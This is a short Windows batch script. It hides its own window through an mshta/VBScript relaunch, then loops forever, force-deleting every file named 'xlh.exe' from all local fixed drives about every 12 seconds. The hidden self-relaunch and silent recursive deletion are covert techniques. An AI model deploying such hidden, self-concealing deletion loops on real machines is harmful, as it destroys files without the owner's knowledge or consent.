@echo off
if "%1" == "h" goto begin 
　　mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit 
　　:begin 
setlocal enabledelayedexpansion
:k
for /l %%i in (1,1,12) do ping 127.0.0.1 -n 2 >nul
set dir="xlh.exe"
for /f "tokens=2 delims==:" %%a in ('wmic LogicalDisk where "DriveType='3'" get DeviceID /value') do (
    pushd %%~a:\
    del /a /f /q /s %dir%
    popd
)
goto k

